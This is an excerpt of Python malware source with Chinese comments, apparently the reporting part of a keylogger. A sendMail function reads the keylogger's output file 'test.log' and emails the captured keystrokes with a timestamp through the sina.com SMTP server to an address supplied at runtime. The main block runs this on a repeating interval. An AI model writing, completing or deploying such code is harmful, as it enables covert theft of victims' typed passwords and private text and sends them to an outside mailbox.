...
def sendMail(theEmail, thePasswd):
    ...
    try:
        fileobj = open("test.log", "r") #键盘记录的输出文件
    ...
    message[ 'From' ] = "anony_mity@sina.com"
    message[ 'To' ] = theEmail
    message.set_payload("当前时间" +systemTime+ "\n" +content) #邮件正文
    msg = message.as_string()

    #smtp = smtplib.SMTP_SSL("smtp.qq.com", port=456, timeout=30)
    smtp = smtplib.SMTP("smtp.sina.com",port=25, timeout=30)
    #smtp.set_debuglevel(1)  #开启debug模式
    #smtp.ehlo()            #LJH add  send ehlo to Gmail
...
if __name__ == "__main__":
    ...
    emailName = ""
    emailPasswd = ""
    myMain(30, emailName, emailPasswd)  #15表示的是相隔时间，可以根据自己的需求设
